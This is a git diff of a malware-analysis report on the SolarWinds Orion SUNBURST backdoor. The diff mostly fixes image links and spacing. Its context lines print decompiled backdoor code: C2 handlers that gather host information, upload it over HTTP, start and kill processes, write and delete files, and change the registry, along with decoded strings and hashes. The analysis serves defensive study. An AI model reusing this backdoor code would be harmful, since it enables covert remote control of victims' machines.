@@ -1,6 +1,7 @@
 **SolarWinds-Core-v2019.4.5220-Hotfix5.msp (md5 02af7cec58b9a5da1c542b5a32151ba1)**
 
-![](https://raw.githubusercontent.com/qeeqbox/reports/solarwinds/main/files/md5file.png)
+![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/md5file.png)
+
 
 **SolarWinds-Core-v2019.4.5220-Hotfix5.msp metadata**
 
@@ -25,6 +26,7 @@ Number of Pages: 200, Number of Characters: 152174623
 **SolarWinds-Core-v2019.4.5220-Hotfix5.msp extracted files**
 
 ![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/extracted.png)
+
 
 **SolarWinds-Core-v2019.4.5220-Hotfix5.msp extracted files md5**
 
@@ -71,17 +73,21 @@ c1c201388736053e9a883867dd5aba79  Toolset_2019.4_Patch.zip
 a56b277160c716b1454e8fa3a7322393  TruncateFirstAndLastPartitions.sql
 ```
 
+
 **SolarWinds.Orion.Core.BusinessLayer.dll metadata**
 
-![](https://raw.githubusercontent.com/qeeqbox/reports/solarwinds/main/files/businesslayermeta.png)
+![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/businesslayermeta.png)
+
 
 **SolarWinds.Orion.Core.BusinessLayer.dll function**
 
-![](https://raw.githubusercontent.com/qeeqbox/reports/solarwinds/main/files/function.png)
+![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/function.png)
+
 
 **SolarWinds.Orion.Core.BusinessLayer.dll variables**
 
-![](https://raw.githubusercontent.com/qeeqbox/reports/solarwinds/main/files/vars.png)
+![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/vars.png)
+
 
 **SolarWinds.Orion.Core.BusinessLayer.dll variables decoded**
 
@@ -94,9 +100,11 @@ Ky3WTU0sLtE1BAA= us-east-1
 Ky3WTU0sLtE1AgA= us-east-2
 ```
 
+
 **SolarWinds.Orion.Core.BusinessLayer.dll c2**
 
-![](https://raw.githubusercontent.com/qeeqbox/reports/solarwinds/main/files/vars.png)
+![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/vars.png)
+
 
 **SolarWinds.Orion.Core.BusinessLayer.dll c2 structure**
 
@@ -133,6 +141,7 @@ public static void SetTime(string[] args, out int delay)
 }
 ```
 
+
 CollectSystemDescription (get host info)
 
 ```
@@ -159,8 +168,8 @@ public static void CollectSystemDescription(string info, out string result)
 	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + info + "\n";
 	result += OrionImprovementBusinessLayer.GetNetworkAdapterConfiguration();
 }
-
 ```
+
 
 UploadSystemDescription (Perform http request)
 
@@ -287,6 +296,7 @@ public static void UploadSystemDescription(string[] args, out string result, IWe
 }
 ```
 
+
 RunTask (Start a process)
 
 ```
@@ -312,6 +322,7 @@ public static int RunTask(string[] args, string cl, out string result)
 }
 
 ```
+
 
 GetProcessByDescription (get processes info)
 
@@ -356,6 +367,7 @@ public static void GetProcessByDescription(string[] args, out string result)
 }
 ```
 
+
 KillTask (Kill a task by PID)
 
 ```
@@ -364,6 +376,7 @@ public static void KillTask(string[] args)
 	Process.GetProcessById(int.Parse(args[0])).Kill();
 }
 ```
+
 
 GetFileSystemEntries (Get files and folders by path)
 
@@ -379,6 +392,7 @@ public static void GetFileSystemEntries(string[] args, out string result)
 	result = string.Join("\n", value2) + "\n\n" + string.Join(" \n", value);
 }
 ```
+
 
 WriteFile (Write to file)
 
@@ -410,6 +424,7 @@ public static void WriteFile(string[] args)
 
 ```
 
+
 FileExists (Check if file exists)
 
 ```
@@ -421,6 +436,7 @@ public static void FileExists(string[] args, out string result)
 
 ```
 
+
 DeleteFile (delete file by path)
 
 ```
@@ -429,6 +445,7 @@ public static void DeleteFile(string[] args)
 	File.Delete(Environment.ExpandEnvironmentVariables(args[0]));
 }
 ```
+
 
 ReadRegistryValue (get a registry value)
 
@@ -443,6 +460,7 @@ public static int ReadRegistryValue(string[] args, out string result)
 	return 1;
 }
 ```
+
 
 SetRegistryValue (modfiy a registry value)
 
@@ -459,6 +477,7 @@ public static int SetRegistryValue(string[] args)
 }
 ```
 
+
 SetRegistryValue (delete a registry value)
 
 ```
@@ -468,6 +487,7 @@ public static void DeleteRegistryValue(string[] args)
 }
 ```
 
+
 GetRegistrySubKeyAndValueNames (get all registry keys and values)
 ```
 public static void GetRegistrySubKeyAndValueNames(string[] args, out string result)
@@ -475,6 +495,7 @@ public static void GetRegistrySubKeyAndValueNames(string[] args, out string resu
 	result = OrionImprovementBusinessLayer.RegistryHelper.GetSubKeyAndValueNames(args[0]);
 }
 ```
+
 
 IOC
 
